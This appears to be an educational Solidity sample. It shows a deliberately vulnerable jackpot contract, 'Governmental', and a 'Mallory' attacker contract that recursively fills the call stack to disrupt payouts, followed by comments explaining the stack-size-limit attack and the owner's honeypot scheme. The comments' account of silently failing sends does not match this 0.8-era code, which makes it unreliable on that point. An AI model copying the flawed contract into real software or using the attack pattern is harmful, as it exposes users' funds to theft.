// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

contract Governmental {
    address public owner;
    address public lastInvestor;
    uint public jackpot = 1 ether;
    uint public lastInvestmentTimestamp;
    uint public ONE_MINUTE = 1 minutes;

    constructor() payable {
        require(msg.value > 1 ether);
        owner = msg.sender;
    }

    function invest() external payable {
        require(msg.value > jackpot/2);
        lastInvestor = msg.sender;
        jackpot += msg.value/2;
        lastInvestmentTimestamp = block.timestamp;
    }

    function resetInvestment() external {
        require(block.timestamp > lastInvestmentTimestamp + ONE_MINUTE);
        payable(lastInvestor).transfer(jackpot);
        payable(owner).transfer(address(this).balance - 1 ether);
        lastInvestor = address(0);
        jackpot = 1 ether;
        lastInvestmentTimestamp = 0;
    }
}

contract Mallory {
    function attack(address target, uint count) external {
        if(0 <= count && count < 1023){
            this.attack{gas: gasleft() - 2000}(target, count + 1);
        } else {
            Governmental(target).resetInvestment();
        }
    }
}

//**Cause:
//The call stack is utilized when a contract invokes another contract, or itself by means of this.f(), is bounded to 1024 frames. If this limit
//is reached, then a further invocation will throw an exception.

//**Attributes:
//A continual sequence of nested calls is generated to create an almost full call stack. An attacker contract typically generates these calls. Once
//the call stack is almost full, the vulnerable contract is invoked.

//**Consequences:
//If the vulnerable contract does not contain the correct exception handling, then the vulnerable contract will be attacked through this vulnerability
//when invoked. These contracts shows an example of Stack Size Limit. The Governmental contract allows for “players” to make investments in the contract
//and the last one to make an investment without another investment occurring for 1 min receives the jackpot (half the investment total) and sends the
//remaining ether to the contract owner. The vulnerable contract titled “Governmental” is exploited by the malicious contract called “Mallory”. The owner
//of the vulnerable contract in this instance is exploiting their contract for financial gain. Essentially, Governmental is a honey pot trap that collects
//ether and only pays out to the owner. Mallory exploits the vulnerability stack size limit by recursively calling herself and in turn growing the stack.
//The result of the stack being enlarged is the intentional failure of the send statements contained in the resetInvestment() function. This failure allows
//the balance of the Governmental contract to grow every time this attack is executed due to the actual winner not being paid. In order for the owner to
//siphon the pooled ether from Governmental the owner would just allow for another round to terminate correctly.
